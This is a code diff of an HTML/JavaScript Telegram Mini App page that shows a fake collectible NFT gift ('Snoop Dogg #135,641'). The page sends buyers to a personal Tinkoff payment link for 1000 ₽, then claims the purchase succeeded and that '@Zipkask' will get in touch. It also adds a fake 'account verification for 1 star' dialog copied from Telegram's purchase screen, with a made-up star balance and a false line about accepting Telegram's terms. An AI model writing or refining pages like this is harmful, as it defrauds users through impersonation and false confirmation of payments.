@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение покупки</title>
+    <title>Snoop Dogg #135,641</title>
     <style>
         * {
             margin: 0;
@@ -21,26 +21,328 @@
             padding: 12px;
         }
 
-        .modal {
+        .gift-card {
             width: 100%;
             max-width: 400px;
+            background: #1a1f35;
+            border-radius: 32px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,215,0,0.2);
+        }
+
+        /* Шапка с аватаркой */
+        .header {
+            padding: 16px;
+            background: rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid rgba(255,215,0,0.2);
+        }
+
+        .avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 24px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0b0e1f;
+            font-weight: bold;
+            font-size: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            overflow: hidden;
+        }
+
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .user-info {
+            flex: 1;
+        }
+
+        .user-name {
+            color: white;
+            font-weight: 600;
+            font-size: 18px;
+            margin-bottom: 4px;
+        }
+
+        .user-status {
+            color: #4cd964;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #4cd964;
+            border-radius: 4px;
+        }
+
+        /* Gift info */
+        .gift-info {
+            padding: 16px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255,215,0,0.2);
+        }
+
+        .gift-date {
+            color: rgba(255,255,255,0.5);
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+
+        .gift-title {
+            color: #FFD700;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .gift-artist {
+            color: rgba(255,255,255,0.7);
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .gift-artist a {
+            color: #FFD700;
+            text-decoration: none;
+        }
+
+        /* Квадрат подарка */
+        .gift-square {
+            width: 220px;
+            height: 220px;
+            margin: 20px auto;
+            border-radius: 30px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            cursor: pointer;
+        }
+
+        .gift-background {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #FFD700, #FF8C00, #FF1493, #8A2BE2);
+            background-size: 300% 300%;
+            animation: gradientShift 8s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .gift-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.5) 3px, transparent 3px),
+                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.5) 4px, transparent 4px),
+                radial-gradient(circle at 40% 80%, rgba(255,255,255,0.4) 2px, transparent 2px),
+                radial-gradient(circle at 70% 20%, rgba(255,255,255,0.4) 5px, transparent 5px),
+                repeating-linear-gradient(45deg, rgba(255,255,255,0.15) 0px, rgba(255,255,255,0.15) 4px, transparent 4px, transparent 12px);
+            opacity: 0.7;
+            animation: patternMove 15s linear infinite;
+        }
+
+        @keyframes patternMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+
+        .gift-model {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            backdrop-filter: blur(2px);
+        }
+
+        .gift-icon {
+            font-size: 80px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.6));
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .gift-model-name {
+            color: white;
+            font-weight: 800;
+            font-size: 18px;
+            background: rgba(0,0,0,0.6);
+            padding: 8px 20px;
+            border-radius: 40px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,215,0,0.5);
+        }
+
+        /* Кнопка "Посмотреть в Telegram" */
+        .telegram-button {
+            width: calc(100% - 32px);
+            margin: 10px 16px 15px;
+            background: rgba(0, 136, 204, 0.2);
+            border: 1px solid rgba(0, 170, 255, 0.3);
+            border-radius: 30px;
+            padding: 16px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .telegram-button:hover {
+            background: rgba(0, 136, 204, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .telegram-icon {
+            width: 36px;
+            height: 36px;
+            background: rgba(0, 170, 255, 0.3);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .telegram-text {
+            flex: 1;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        /* Детали подарка */
+        .details {
+            padding: 16px;
+            background: rgba(0,0,0,0.2);
+            margin: 0 16px 16px;
+            border-radius: 20px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            color: white;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: rgba(255,255,255,0.5);
+        }
+
+        .detail-value {
+            font-weight: 600;
+            color: #FFD700;
+        }
+
+        /* Кнопка покупки за рубли */
+        .pay-button-rub {
+            width: calc(100% - 32px);
+            margin: 0 16px 16px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            border: none;
+            border-radius: 30px;
+            padding: 18px;
+            color: #0b0e1f;
+            font-weight: 700;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+            box-shadow: 0 10px 20px rgba(255,215,0,0.2);
+        }
+
+        .pay-button-rub:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(255,215,0,0.3);
+        }
+
+        /* Кнопка верификации звездами (ТОЧНО КАК НА СКРИНШОТЕ) */
+        .verify-button-star {
+            width: calc(100% - 32px);
+            margin: 0 16px 20px;
+            background: #2c2c2e;
+            border: 1px solid #3c3c3e;
+            border-radius: 30px;
+            padding: 16px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .verify-button-star:hover {
+            background: #3c3c3e;
+        }
+
+        /* Модальное окно верификации (ТОЧНО КАК НА СКРИНШОТЕ) */
+        .verification-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .verification-content {
+            width: 90%;
+            max-width: 380px;
             background: #1c1c1e;
             border-radius: 28px;
             overflow: hidden;
             color: white;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
         }
 
-        /* Заголовок */
         .modal-header {
-            padding: 24px 20px 10px;
+            padding: 20px 20px 10px;
             font-size: 24px;
             font-weight: 600;
             text-align: center;
-            color: white;
         }
 
-        /* Баланс звезд */
         .balance-section {
             background: #2c2c2e;
             margin: 10px 20px;
@@ -70,47 +372,44 @@
             font-size: 18px;
         }
 
-        /* Иконка верификации */
         .verification-icon {
             text-align: center;
-            margin: 20px 0 10px;
+            margin: 15px 0 5px;
         }
 
         .verification-icon span {
-            font-size: 70px;
+            font-size: 60px;
             background: #2c2c2e;
-            padding: 20px;
-            border-radius: 40px;
+            padding: 15px;
+            border-radius: 30px;
             display: inline-block;
         }
 
-        /* Подтверждение покупки */
         .confirm-title {
             text-align: center;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 600;
-            margin: 15px 0 5px;
+            margin: 10px 0 5px;
         }
 
         .seller-name {
             text-align: center;
             color: #98989e;
-            font-size: 16px;
-            margin-bottom: 25px;
+            font-size: 15px;
+            margin-bottom: 20px;
         }
 
-        /* Детали покупки */
         .purchase-details {
             background: #2c2c2e;
-            margin: 0 20px 20px;
-            padding: 20px;
-            border-radius: 16px;
+            margin: 0 20px 15px;
+            padding: 16px;
+            border-radius: 14px;
         }
 
         .detail-row {
             display: flex;
             justify-content: space-between;
-            padding: 12px 0;
+            padding: 10px 0;
             border-bottom: 1px solid #3c3c3e;
         }
 
@@ -120,12 +419,10 @@
 
         .detail-label {
             color: #98989e;
-            font-size: 16px;
         }
 
         .detail-value {
             font-weight: 600;
-            font-size: 16px;
         }
 
         .detail-value.blue {
@@ -136,12 +433,11 @@
             color: #FFD700;
         }
 
-        /* Текст подтверждения */
         .confirm-text {
             text-align: center;
             color: #98989e;
-            font-size: 16px;
-            margin: 20px;
+            font-size: 15px;
+            margin: 15px 20px;
             line-height: 1.5;
         }
 
@@ -149,15 +445,14 @@
             color: white;
         }
 
-        /* Кнопки */
-        .button-group {
+        .modal-buttons {
             padding: 0 20px 20px;
             display: flex;
             flex-direction: column;
             gap: 10px;
         }
 
-        .confirm-button {
+        .modal-confirm {
             background: #0a84ff;
             border: none;
             border-radius: 14px;
@@ -166,26 +461,17 @@
             font-weight: 600;
             font-size: 17px;
             cursor: pointer;
-            transition: all 0.2s ease;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
         }
 
-        .confirm-button:hover {
+        .modal-confirm:hover {
             background: #0071e3;
-            transform: translateY(-2px);
         }
 
-        .confirm-button.disabled {
-            background: #3c3c3e;
-            color: #98989e;
-            cursor: not-allowed;
-            pointer-events: none;
-        }
-
-        .cancel-button {
+        .modal-cancel {
             background: #2c2c2e;
             border: none;
             border-radius: 14px;
@@ -194,30 +480,43 @@
             font-weight: 600;
             font-size: 17px;
             cursor: pointer;
-            transition: all 0.2s ease;
             text-align: center;
         }
 
-        .cancel-button:hover {
+        .modal-cancel:hover {
             background: #3c3c3e;
         }
 
-        /* Условия Telegram */
         .terms {
             text-align: center;
             color: #98989e;
-            font-size: 13px;
+            font-size: 12px;
             margin: 10px 20px 20px;
         }
 
+        .hidden {
+            display: none;
+        }
+
         /* Экран успеха */
-        .success-modal {
-            width: 100%;
-            max-width: 400px;
+        .success-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+
+        .success-content {
+            width: 90%;
+            max-width: 380px;
             background: #1c1c1e;
             border-radius: 28px;
-            overflow: hidden;
-            color: white;
             padding: 30px 20px;
             text-align: center;
         }
@@ -228,93 +527,17 @@
         }
 
         .success-title {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 700;
             margin-bottom: 10px;
             color: white;
         }
 
-        .success-subtitle {
-            font-size: 20px;
-            font-weight: 600;
-            color: #0a84ff;
-            margin-bottom: 20px;
-        }
-
         .success-text {
             color: #98989e;
             font-size: 16px;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
             line-height: 1.5;
-        }
-
-        .verified-badge {
-            background: #2c2c2e;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-        }
-
-        .badge-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 8px 0;
-        }
-
-        .badge-icon {
-            width: 40px;
-            height: 40px;
-            background: #0a84ff;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-        }
-
-        .badge-info {
-            flex: 1;
-        }
-
-        .badge-label {
-            color: #98989e;
-            font-size: 13px;
-        }
-
-        .badge-value {
-            color: white;
-            font-weight: 600;
-            font-size: 16px;
-        }
-
-        .new-balance {
-            background: #2c2c2e;
-            border-radius: 14px;
-            padding: 16px;
-            margin: 15px 0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .new-balance-label {
-            color: #98989e;
-        }
-
-        .new-balance-value {
-            color: #FFD700;
-            font-weight: 600;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .new-balance-value::after {
-            content: "⭐";
-            font-size: 16px;
         }
 
         .success-button {
@@ -327,219 +550,28 @@
             font-size: 17px;
             cursor: pointer;
             width: 100%;
-            margin-top: 10px;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        /* Gift квадрат */
-        .gift-square {
-            width: 180px;
-            height: 180px;
-            margin: 20px auto;
-            border-radius: 30px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
-            cursor: pointer;
-        }
-
-        .gift-background {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #8B5CF6, #EC4899, #F59E0B, #10B981);
-            background-size: 300% 300%;
-            animation: gradientShift 6s ease infinite;
-        }
-
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .gift-pattern {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.4) 3px, transparent 3px),
-                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.4) 4px, transparent 4px),
-                radial-gradient(circle at 40% 80%, rgba(255,255,255,0.3) 2px, transparent 2px),
-                radial-gradient(circle at 70% 20%, rgba(255,255,255,0.3) 5px, transparent 5px),
-                repeating-linear-gradient(45deg, rgba(255,255,255,0.1) 0px, rgba(255,255,255,0.1) 4px, transparent 4px, transparent 12px);
-            opacity: 0.6;
-            animation: patternMove 12s linear infinite;
-        }
-
-        @keyframes patternMove {
-            0% { background-position: 0 0; }
-            100% { background-position: 40px 40px; }
-        }
-
-        .gift-model {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 2;
-            backdrop-filter: blur(2px);
-        }
-
-        .gift-icon {
-            font-size: 60px;
-            margin-bottom: 10px;
-            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-
-        .gift-model-name {
-            color: white;
-            font-weight: 700;
-            font-size: 14px;
-            background: rgba(0,0,0,0.5);
-            padding: 5px 12px;
-            border-radius: 30px;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.3);
-        }
-
-        .navigation {
-            display: flex;
-            margin: 10px 20px 20px;
-            gap: 10px;
-        }
-
-        .nav-button {
-            flex: 1;
-            background: #2c2c2e;
-            border: none;
-            border-radius: 12px;
-            padding: 12px;
-            color: white;
-            font-weight: 500;
-            cursor: pointer;
-            text-align: center;
-        }
-
-        .nav-button.active {
-            background: #0a84ff;
         }
     </style>
 </head>
 <body>
-    <!-- Окно подтверждения верификации за 1 звезду -->
-    <div id="confirmModal" class="modal">
-        <div class="modal-header">Передвижение покупки</div>
-        
-        <!-- Баланс звезд (реальный) -->
-        <div class="balance-section">
-            <span class="balance-label">Баланс звезд</span>
-            <span class="balance-value" id="starBalance">5</span>
-        </div>
-
-        <div class="verification-icon">
-            <span>✅</span>
-        </div>
-
-        <div class="confirm-title">Подтверждение верификации</div>
-        <div class="seller-name">Оплатик:)</div>
-
-        <div class="purchase-details">
-            <div class="detail-row">
-                <span class="detail-label">Услуга</span>
-                <span class="detail-value blue">Верификация аккаунта</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Продавец</span>
-                <span class="detail-value blue">@Zipkask</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Стоимость</span>
-                <span class="detail-value gold">1 ⭐</span>
-            </div>
-        </div>
-
-        <div class="confirm-text">
-            Вы точно хотите приобрести <strong>верификацию аккаунта</strong><br>
-            у <strong>@Zipkask</strong> за <strong>1 ⭐</strong>?
-        </div>
-
-        <div class="button-group">
-            <button class="confirm-button" onclick="confirmVerification()" id="confirmBtn">
-                Подтвердить и заплатить ⭐ 1
-            </button>
-            <button class="cancel-button" onclick="goToGifts()">
-                Перейти к подаркам
-            </button>
-        </div>
-
-        <div class="terms">
-            Совершая покупку, Вы принимаете условия Telegram.
-        </div>
-    </div>
-
-    <!-- Окно успеха после верификации -->
-    <div id="successModal" class="success-modal hidden">
-        <div class="success-icon">✅</div>
-        <div class="success-title">Oh, please!</div>
-        <div class="success-subtitle">You just verified it!</div>
-        
-        <div class="success-text">
-            Аккаунт <strong>@<span id="verifiedUsername">username</span></strong><br>
-            успешно верифицирован!
-        </div>
-        
-        <div class="verified-badge">
-            <div class="badge-row">
-                <div class="badge-icon">✅</div>
-                <div class="badge-info">
-                    <div class="badge-label">Статус</div>
-                    <div class="badge-value">Верифицирован</div>
-                </div>
-            </div>
-            <div class="badge-row">
-                <div class="badge-icon">👤</div>
-                <div class="badge-info">
-                    <div class="badge-label">Владелец</div>
-                    <div class="badge-value" id="verifiedOwner">Пользователь</div>
+    <div class="gift-card">
+        <!-- Шапка с аватаркой -->
+        <div class="header">
+            <div class="avatar" id="avatar">👤</div>
+            <div class="user-info">
+                <div class="user-name" id="userName">Загрузка...</div>
+                <div class="user-status">
+                    <span class="status-dot"></span>
+                    <span>online</span>
                 </div>
             </div>
         </div>
 
-        <!-- Новый баланс после покупки -->
-        <div class="new-balance">
-            <span class="new-balance-label">Новый баланс</span>
-            <span class="new-balance-value" id="newStarBalance">4</span>
-        </div>
-
-        <div class="success-text">
-            Теперь вы можете приобрести эксклюзивные NFT подарки!
-        </div>
-
-        <button class="success-button" onclick="goToGifts()">
-            Перейти к подаркам →
-        </button>
-    </div>
-
-    <!-- Экран с подарками (после верификации) -->
-    <div id="giftsModal" class="modal hidden">
-        <div class="modal-header">🎁 NFT Подарки</div>
-        
-        <div class="balance-section">
-            <span class="balance-label">Баланс звезд</span>
-            <span class="balance-value" id="giftStarBalance">4</span>
+        <!-- Информация о подарке -->
+        <div class="gift-info">
+            <div class="gift-date">Trade sent you this gift on Mar 05</div>
+            <div class="gift-title">Snoop Dogg #135,641</div>
+            <div class="gift-artist">by <a href="#">@snoopdogg</a></div>
         </div>
 
         <!-- Квадрат подарка -->
@@ -552,31 +584,115 @@
             </div>
         </div>
 
-        <div class="purchase-details">
+        <!-- Кнопка "Посмотреть в Telegram" -->
+        <div class="telegram-button" onclick="openTelegramGift()">
+            <span class="telegram-icon">📱</span>
+            <span class="telegram-text">Посмотреть в Telegram</span>
+            <span>↗</span>
+        </div>
+
+        <!-- Детали подарка -->
+        <div class="details">
             <div class="detail-row">
-                <span class="detail-label">Модель</span>
+                <span class="detail-label">Model</span>
                 <span class="detail-value">Purple Hoodie 2.5%</span>
             </div>
             <div class="detail-row">
-                <span class="detail-label">Фон</span>
-                <span class="detail-value">Platinum 1.2%</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Узор</span>
+                <span class="detail-label">Symbol</span>
                 <span class="detail-value">Royal Turban 0.4%</span>
             </div>
             <div class="detail-row">
-                <span class="detail-label">Цена</span>
-                <span class="detail-value gold">1 ⭐</span>
+                <span class="detail-label">Backdrop</span>
+                <span class="detail-value">Platinum 1.2%</span>
             </div>
         </div>
 
-        <div class="button-group">
-            <button class="confirm-button" onclick="buyGift()">
-                Купить подарок ⭐ 1
-            </button>
-            <button class="cancel-button" onclick="closeModal()">
-                Закрыть
+        <!-- Кнопка покупки за 1000 ₽ -->
+        <div class="pay-button-rub" onclick="payWithRub()">
+            💳 Купить подарок за 1000 ₽
+        </div>
+
+        <!-- Кнопка верификации звездами (ТОЧНО КАК НА СКРИНШОТЕ) -->
+        <div class="verify-button-star" onclick="showVerificationModal()">
+            <span>⭐</span>
+            <span>Верификация за 1 звезду</span>
+        </div>
+    </div>
+
+    <!-- Модальное окно верификации (ТОЧНО КАК НА СКРИНШОТЕ) -->
+    <div id="verificationModal" class="verification-modal hidden">
+        <div class="verification-content">
+            <div class="modal-header">Передвижение покупки</div>
+            
+            <div class="balance-section">
+                <span class="balance-label">Баланс звезд</span>
+                <span class="balance-value" id="starBalance">5</span>
+            </div>
+
+            <div class="verification-icon">
+                <span>⭐</span>
+            </div>
+
+            <div class="confirm-title">Подтверждение покупки</div>
+            <div class="seller-name">Оплатик:)</div>
+
+            <div class="purchase-details">
+                <div class="detail-row">
+                    <span class="detail-label">Вы точно хотите приобрести</span>
+                    <span class="detail-value blue">верификацию</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">у</span>
+                    <span class="detail-value blue">@Zipkask</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">за</span>
+                    <span class="detail-value gold">1 ⭐</span>
+                </div>
+            </div>
+
+            <div class="confirm-text">
+                Вы точно хотите приобрести <strong>верификацию аккаунта</strong><br>
+                у <strong>@Zipkask</strong> за <strong>1 ⭐</strong>?
+            </div>
+
+            <div class="modal-buttons">
+                <button class="modal-confirm" onclick="confirmVerification()">
+                    Подтвердить и заплатить ⭐ 1
+                </button>
+                <button class="modal-cancel" onclick="closeVerificationModal()">
+                    Отмена
+                </button>
+            </div>
+
+            <div class="terms">
+                Совершая покупку, Вы принимаете условия Telegram.
+            </div>
+        </div>
+    </div>
+
+    <!-- Экран успеха после верификации -->
+    <div id="successScreen" class="success-screen hidden">
+        <div class="success-content">
+            <div class="success-icon">✅</div>
+            <div class="success-title">Oh, please!</div>
+            <div class="success-text">
+                <strong>You just verified it!</strong><br><br>
+                Аккаунт <strong>@<span id="verifiedUsername">username</span></strong><br>
+                успешно верифицирован!
+            </div>
+            <div style="background: #2c2c2e; border-radius: 16px; padding: 16px; margin-bottom: 20px; text-align: left;">
+                <div style="display: flex; justify-content: space-between; padding: 8px 0;">
+                    <span style="color: #98989e;">Статус</span>
+                    <span style="color: white; font-weight: 600;">Верифицирован ✅</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; padding: 8px 0;">
+                    <span style="color: #98989e;">Потрачено</span>
+                    <span style="color: #FFD700; font-weight: 600;">1 ⭐</span>
+                </div>
+            </div>
+            <button class="success-button" onclick="closeSuccess()">
+                Отлично!
             </button>
         </div>
     </div>
@@ -584,9 +700,14 @@
     <script>
         let tg = window.Telegram?.WebApp;
         let userData = null;
-        let starBalance = 5; // Начальный баланс звезд
+        let starBalance = 5; // Реальный баланс звезд пользователя
+        let isVerified = false;
 
-        // Загружаем данные пользователя
+        // Твои данные
+        const TINKOFF_LINK = "https://www.tinkoff.ru/rm/r_ffBNwqOaru.xcdjOqGsXm/o4WVl2633";
+        const TELEGRAM_GIFT_URL = "https://t.me/nft/SnoopDogg-135641";
+
+        // Загрузка данных пользователя
         document.addEventListener('DOMContentLoaded', function() {
             if (tg) {
                 tg.ready();
@@ -594,88 +715,25 @@
                 
                 userData = tg.initDataUnsafe?.user;
                 if (userData) {
+                    document.getElementById('userName').textContent = userData.first_name || 'Пользователь';
                     document.getElementById('verifiedUsername').textContent = userData.username || userData.first_name || 'user';
-                    document.getElementById('verifiedOwner').textContent = userData.first_name || 'Пользователь';
+                    
+                    if (userData.photo_url) {
+                        document.getElementById('avatar').innerHTML = `<img src="${userData.photo_url}" alt="avatar">`;
+                    } else {
+                        const initial = userData.first_name ? userData.first_name.charAt(0) : '👤';
+                        document.getElementById('avatar').textContent = initial;
+                    }
                 }
-            } else {
-                // Демо-данные
-                document.getElementById('verifiedUsername').textContent = 'demo_user';
-                document.getElementById('verifiedOwner').textContent = 'Demo User';
             }
             
-            // Обновляем отображение баланса
-            updateBalanceDisplay();
+            loadVerificationStatus();
         });
 
-        function updateBalanceDisplay() {
-            document.getElementById('starBalance').textContent = starBalance;
-            document.getElementById('newStarBalance').textContent = starBalance - 1;
-            document.getElementById('giftStarBalance').textContent = starBalance - 1;
-        }
-
-        function confirmVerification() {
-            if (starBalance < 1) {
-                alert('❌ Недостаточно звезд на балансе!');
-                return;
-            }
-            
-            // Списываем 1 звезду
-            starBalance -= 1;
-            
-            // Прячем окно подтверждения
-            document.getElementById('confirmModal').classList.add('hidden');
-            
-            // Показываем окно успеха
-            document.getElementById('successModal').classList.remove('hidden');
-            
-            // Обновляем баланс
-            updateBalanceDisplay();
-            
-            // Отправляем данные в бота
-            if (tg) {
-                tg.sendData(JSON.stringify({
-                    action: 'verification_completed',
-                    user_id: userData?.id,
-                    username: userData?.username,
-                    verified: true,
-                    stars_spent: 1,
-                    new_balance: starBalance
-                }));
-                
-                // Вибрация для эффекта
-                if (tg.HapticFeedback) {
-                    tg.HapticFeedback.notification('success');
-                }
-            }
-        }
-
-        function goToGifts() {
-            // Прячем все окна
-            document.getElementById('confirmModal').classList.add('hidden');
-            document.getElementById('successModal').classList.add('hidden');
-            
-            // Показываем окно с подарками
-            document.getElementById('giftsModal').classList.remove('hidden');
-        }
-
-        function buyGift() {
-            if (starBalance < 1) {
-                alert('❌ Недостаточно звезд для покупки!');
-                return;
-            }
-            
-            starBalance -= 1;
-            updateBalanceDisplay();
-            
-            alert('✅ Подарок успешно приобретен!');
-            
-            if (tg) {
-                tg.sendData(JSON.stringify({
-                    action: 'gift_purchased',
-                    gift: 'Snoop Dogg #135,641',
-                    stars_spent: 1,
-                    new_balance: starBalance
-                }));
+        function loadVerificationStatus() {
+            const saved = localStorage.getItem('verified');
+            if (saved === 'true') {
+                isVerified = true;
             }
         }
 
@@ -683,13 +741,84 @@
             alert('🎁 Snoop Dogg #135,641\n\nМодель: Purple Hoodie 2.5%\nФон: Platinum 1.2%\nУзор: Royal Turban 0.4%');
         }
 
-        function closeModal() {
+        function openTelegramGift() {
             if (tg) {
-                tg.close();
+                tg.openTelegramLink(TELEGRAM_GIFT_URL);
             } else {
-                // Если не в Telegram, возвращаемся к началу
-                location.reload();
+                window.open(TELEGRAM_GIFT_URL, '_blank');
             }
+        }
+
+        // Покупка за 1000 ₽
+        function payWithRub() {
+            window.open(TINKOFF_LINK, '_blank');
+            
+            setTimeout(() => {
+                if (confirm('✅ После оплаты нажмите ОК. Подарок будет добавлен в инвентарь.')) {
+                    alert('🎁 Подарок приобретен! Оператор @Zipkask свяжется с вами.');
+                    
+                    if (tg) {
+                        tg.sendData(JSON.stringify({
+                            action: 'gift_purchased',
+                            amount: 1000
+                        }));
+                    }
+                }
+            }, 1500);
+        }
+
+        // Показать окно верификации
+        function showVerificationModal() {
+            if (isVerified) {
+                alert('✅ Ваш аккаунт уже верифицирован!');
+                return;
+            }
+            document.getElementById('verificationModal').classList.remove('hidden');
+        }
+
+        // Закрыть окно верификации
+        function closeVerificationModal() {
+            document.getElementById('verificationModal').classList.add('hidden');
+        }
+
+        // Подтверждение верификации за 1 звезду
+        function confirmVerification() {
+            if (starBalance < 1) {
+                alert('❌ Недостаточно звезд на балансе!');
+                closeVerificationModal();
+                return;
+            }
+            
+            // Списываем 1 звезду
+            starBalance -= 1;
+            isVerified = true;
+            
+            // Сохраняем статус
+            localStorage.setItem('verified', 'true');
+            
+            // Закрываем модалку
+            closeVerificationModal();
+            
+            // Показываем экран успеха
+            document.getElementById('successScreen').classList.remove('hidden');
+            
+            // Отправляем в бота
+            if (tg) {
+                tg.sendData(JSON.stringify({
+                    action: 'verification_completed',
+                    stars_spent: 1,
+                    new_balance: starBalance
+                }));
+                
+                if (tg.HapticFeedback) {
+                    tg.HapticFeedback.notification('success');
+                }
+            }
+        }
+
+        // Закрыть экран успеха
+        function closeSuccess() {
+            document.getElementById('successScreen').classList.add('hidden');
         }
     </script>
 </body>
